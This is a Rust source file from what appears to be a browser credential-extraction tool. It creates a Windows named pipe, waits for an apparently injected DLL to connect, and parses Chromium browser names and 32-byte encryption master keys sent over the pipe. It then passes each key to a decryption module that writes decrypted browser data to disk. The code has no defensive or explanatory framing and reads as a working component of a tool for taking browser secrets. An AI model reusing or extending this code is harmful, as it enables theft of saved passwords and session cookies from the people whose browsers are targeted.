use anyhow::{Result, anyhow};
use std::path::PathBuf;
use std::{thread, time::Duration};
use uuid::Uuid;
use winapi::ctypes::c_void;
use winapi::shared::ntdef::HANDLE;
use winapi::shared::winerror::*;
use winapi::um::fileapi::*;
use winapi::um::handleapi::*;
use winapi::um::namedpipeapi::*;
use winapi::um::winbase::*;

use crate::modules::browser::chromium::crypto::decrypt::{DecryptionProcessor, MasterKeyData};

// Additional error constants for better debugging
const ERROR_IO_PENDING: u32 = 997;
const ERROR_PIPE_BUSY: u32 = 231;
const ERROR_NO_DATA: u32 = 232;
const ERROR_PIPE_NOT_CONNECTED: u32 = 233;

pub struct PipeCommunicator {
    pipe_name: String,
    pipe_handle: HANDLE,
}

impl PipeCommunicator {
    pub fn _new() -> Self {
        let uuid = Uuid::new_v4();
        let pipe_name = format!(r"\\.\pipe\{}", uuid);

        Self {
            pipe_name,
            pipe_handle: INVALID_HANDLE_VALUE,
        }
    }

    pub fn new_with_prefix(prefix: &str) -> Self {
        let uuid = Uuid::new_v4();
        let pipe_name = format!(r"\\.\pipe\{}_{}", prefix, uuid);

        Self {
            pipe_name,
            pipe_handle: INVALID_HANDLE_VALUE,
        }
    }

    pub fn create(&mut self) -> Result<()> {
        unsafe {
            let pipe_name_wide: Vec<u16> = self.pipe_name.encode_utf16().chain(Some(0)).collect();

            self.pipe_handle = CreateNamedPipeW(
                pipe_name_wide.as_ptr(),
                PIPE_ACCESS_DUPLEX,
                PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                1,                    // nMaxInstances
                4096,                 // nOutBufferSize
                4096,                 // nInBufferSize
                0,                    // nDefaultTimeOut
                std::ptr::null_mut(), // lpSecurityAttributes
            );

            if self.pipe_handle == INVALID_HANDLE_VALUE {
                return Err(anyhow!("Failed to create named pipe: {}", self.pipe_name));
            }

            Ok(())
        }
    }

    pub fn get_name(&self) -> String {
        self.pipe_name.clone()
    }

    pub fn wait_for_connection(&mut self) -> Result<()> {
        unsafe {
            use winapi::um::namedpipeapi::SetNamedPipeHandleState;
            let mut mode = PIPE_READMODE_MESSAGE | PIPE_WAIT;
            let mut max_collection_count = 0;
            let mut collect_data_timeout = 5000; // 5 seconds timeout per operation

            let _ = SetNamedPipeHandleState(
                self.pipe_handle,
                &mut mode,
                &mut max_collection_count,
                &mut collect_data_timeout,
            );

            // Attempt connection with manual timeout using threading
            let pipe_handle = self.pipe_handle;
            let start_time = std::time::Instant::now();
            const CONNECTION_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30); // Increased timeout

            // Use a non-blocking approach with polling
            loop {
                let result = ConnectNamedPipe(pipe_handle, std::ptr::null_mut());
                let error = winapi::um::errhandlingapi::GetLastError();

                if result != 0 || error == ERROR_PIPE_CONNECTED {
                    return Ok(());
                }

                // Check for specific errors that indicate connection issues
                match error {
                    ERROR_IO_PENDING => {
                        thread::sleep(Duration::from_millis(500));
                    }
                    ERROR_PIPE_BUSY => {
                        return Err(anyhow!("Pipe is busy"));
                    }
                    ERROR_NO_DATA => {
                        thread::sleep(Duration::from_millis(500));
                    }
                    ERROR_PIPE_NOT_CONNECTED => {
                        thread::sleep(Duration::from_millis(500));
                    }
                    _ => {
                        thread::sleep(Duration::from_millis(500));
                    }
                }

                // Check timeout
                if start_time.elapsed() > CONNECTION_TIMEOUT {
                    return Err(anyhow!(
                        "Connection timeout after {} seconds",
                        CONNECTION_TIMEOUT.as_secs()
                    ));
                }

                // Show progress every 5 seconds
                if start_time.elapsed().as_secs() % 5 == 0
                    && start_time.elapsed().as_millis() % 5000 < 500
                {}
            }
        }
    }

    pub fn send_message(&mut self, message: &str) -> Result<()> {
        unsafe {
            // Create null-terminated string
            let mut message_bytes = message.as_bytes().to_vec();
            message_bytes.push(0); // Add null terminator
            let mut bytes_written = 0;

            let result = WriteFile(
                self.pipe_handle,
                message_bytes.as_ptr() as *const c_void,
                message_bytes.len() as u32,
                &mut bytes_written,
                std::ptr::null_mut(),
            );

            if result == 0 {
                return Err(anyhow!("Failed to write to pipe"));
            }

            Ok(())
        }
    }

    pub fn _receive_message(&mut self) -> Result<String> {
        unsafe {
            let mut buffer = [0u8; 4096];
            let mut bytes_read = 0;

            let result = ReadFile(
                self.pipe_handle,
                buffer.as_mut_ptr() as *mut c_void,
                buffer.len() as u32,
                &mut bytes_read,
                std::ptr::null_mut(),
            );

            if result == 0 {
                return Err(anyhow!("Failed to read from pipe"));
            }

            // Convert bytes to string, handling null terminators properly
            let message = String::from_utf8_lossy(&buffer[..bytes_read as usize]).to_string();
            Ok(message)
        }
    }

    pub fn relay_messages_until_complete(&mut self, output_dir: Option<PathBuf>) -> Result<()> {
        const DLL_COMPLETION_TIMEOUT_MS: u32 = 60000;
        const DLL_COMPLETION_SIGNAL: &str = "__DLL_PIPE_COMPLETION_SIGNAL__";
        const MASTER_KEY_MARKER: &str = "__MASTER_KEY_DATA__";

        let start_time = std::time::Instant::now();
        let mut accumulated_data = Vec::new();
        let mut in_master_key_mode = false;

        // Create decryption processor
        let output_path = output_dir.unwrap_or_else(|| std::env::current_dir().unwrap());
        let decryption_processor = DecryptionProcessor::new(output_path, true);

        loop {
            // Check for timeout
            if start_time.elapsed().as_millis() > (DLL_COMPLETION_TIMEOUT_MS as u128) {
                return Err(anyhow!(
                    "DLL operation timed out after {} seconds",
                    DLL_COMPLETION_TIMEOUT_MS / 1000
                ));
            }

            // Try to receive raw data
            match self.receive_raw_data_with_timeout(100) {
                Ok(Some(data)) => {
                    accumulated_data.extend_from_slice(&data);

                    // Process accumulated data
                    if !in_master_key_mode {
                        // Look for text messages or master key marker
                        if let Some(text) = self.try_extract_text_message(&mut accumulated_data) {
                            if text == MASTER_KEY_MARKER {
                                in_master_key_mode = true;
                            } else if text == DLL_COMPLETION_SIGNAL {
                                return Ok(());
                            }
                        }
                    } else {
                        // In master key mode - look for complete master key data
                        if let Some(key_data) =
                            self.try_extract_master_key(&mut accumulated_data)?
                        {
                            match decryption_processor.process_master_key(key_data) {
                                Ok(()) => {}
                                Err(_e) => {}
                            }
                            in_master_key_mode = false;
                        }
                    }
                }
                Ok(None) => {
                    // Timeout, continue loop
                    std::thread::sleep(std::time::Duration::from_millis(50));
                    continue;
                }
                Err(e) => {
                    return Err(anyhow!("Failed to receive message: {}", e));
                }
            }
        }
    }

    fn receive_raw_data_with_timeout(&mut self, _timeout_ms: u32) -> Result<Option<Vec<u8>>> {
        unsafe {
            // Use PeekNamedPipe to check if data is available
            let mut bytes_available = 0;
            let peek_result = winapi::um::namedpipeapi::PeekNamedPipe(
                self.pipe_handle,
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
                &mut bytes_available,
                std::ptr::null_mut(),
            );

            if peek_result == 0 || bytes_available == 0 {
                return Ok(None);
            }

            // Read available data
            let mut buffer = vec![0u8; bytes_available as usize];
            let mut bytes_read = 0;

            let result = ReadFile(
                self.pipe_handle,
                buffer.as_mut_ptr() as *mut c_void,
                buffer.len() as u32,
                &mut bytes_read,
                std::ptr::null_mut(),
            );

            if result == 0 {
                return Err(anyhow!("Failed to read from pipe"));
            }

            buffer.truncate(bytes_read as usize);
            Ok(Some(buffer))
        }
    }

    fn try_extract_text_message(&self, buffer: &mut Vec<u8>) -> Option<String> {
        // Look for null-terminated string at the beginning
        if let Some(null_pos) = buffer.iter().position(|&b| b == 0) {
            let text_bytes = buffer.drain(..=null_pos).collect::<Vec<u8>>();
            String::from_utf8_lossy(&text_bytes[..text_bytes.len() - 1])
                .to_string()
                .into()
        } else {
            None
        }
    }

    fn try_extract_master_key(&self, buffer: &mut Vec<u8>) -> Result<Option<MasterKeyData>> {
        // Need: browser_name_len (4 bytes) + browser_name + master_key (32 bytes) + completion marker
        const COMPLETION_MARKER: &[u8] = b"__MASTER_KEY_COMPLETE__\0";

        if buffer.len() < 4 {
            return Ok(None); // Not enough data for length
        }

        // Read browser name length
        let browser_name_len =
            u32::from_le_bytes([buffer[0], buffer[1], buffer[2], buffer[3]]) as usize;

        let total_needed = 4 + browser_name_len + 32 + COMPLETION_MARKER.len();
        if buffer.len() < total_needed {
            return Ok(None); // Not enough data yet
        }

        // Extract browser name
        let browser_name_bytes = &buffer[4..4 + browser_name_len];
        let browser_name = String::from_utf8_lossy(browser_name_bytes).to_string();

        // Extract master key
        let master_key = buffer[4 + browser_name_len..4 + browser_name_len + 32].to_vec();

        // Verify completion marker
        let marker_start = 4 + browser_name_len + 32;
        let marker_end = marker_start + COMPLETION_MARKER.len();
        if buffer[marker_start..marker_end] != *COMPLETION_MARKER {
            return Err(anyhow!("Master key completion marker not found"));
        }

        // Remove processed data from buffer
        buffer.drain(..total_needed);

        Ok(Some(MasterKeyData {
            browser_name,
            master_key,
        }))
    }
}

impl Drop for PipeCommunicator {
    fn drop(&mut self) {
        unsafe {
            if self.pipe_handle != INVALID_HANDLE_VALUE {
                CloseHandle(self.pipe_handle);
            }
        }
    }
}
